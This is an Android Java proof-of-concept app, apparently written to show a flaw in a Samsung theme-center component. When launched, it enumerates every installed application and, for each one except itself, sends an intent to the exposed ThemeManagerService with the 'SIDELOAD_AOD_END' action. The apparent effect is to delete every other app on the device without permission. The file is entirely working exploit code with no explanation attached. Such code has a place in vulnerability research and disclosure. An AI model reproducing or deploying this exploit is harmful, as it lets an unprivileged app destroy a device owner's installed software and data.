package poc.app;

import android.app.Activity;
import android.content.Intent;
import android.content.pm.ApplicationInfo;
import android.os.Bundle;

public class MainActivity extends Activity {
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);

        for (ApplicationInfo info : getPackageManager().getInstalledApplications(0)) {
            String pkg = info.packageName;
            if (!getPackageName().equals(pkg)) {
                deletePackage(pkg);
            }
        }
    }

    private void deletePackage(String pkg) {
        Bundle bundle = new Bundle();
        bundle.putString("extra_package", pkg);

        Intent i = new Intent("com.samsung.android.theme.action.SIDELOAD_AOD_END");
        i.setClassName("com.samsung.android.themecenter", "com.samsung.android.thememanager.ThemeManagerService");
        i.putExtra("extra_bundle", bundle);
        startService(i);
    }
}